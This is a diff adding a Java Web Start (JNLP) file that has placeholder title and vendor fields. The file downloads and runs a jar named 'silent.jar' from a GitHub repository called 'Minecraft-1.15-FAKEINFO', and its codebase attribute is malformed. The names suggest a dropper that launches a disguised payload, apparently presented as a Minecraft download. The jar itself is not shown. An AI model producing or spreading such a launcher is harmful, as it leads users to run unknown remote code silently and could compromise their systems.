@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jnlp spec="1.0+" codebase="https://github.com/lolka13372/Minecraft-1.15-FAKEINFO/raw/master/silent.jar" href="app.jnlp">
+    <information>
+        <title>Your App Title</title>
+        <vendor>Your Company Name</vendor>
+    </information>
+    <resources>
+        <j2se version="1.8+" />
+        <jar href="silent.jar" main="true" />
+    </resources>
+    <application-desc main-class="com.example.MainMain" />
+</jnlp>
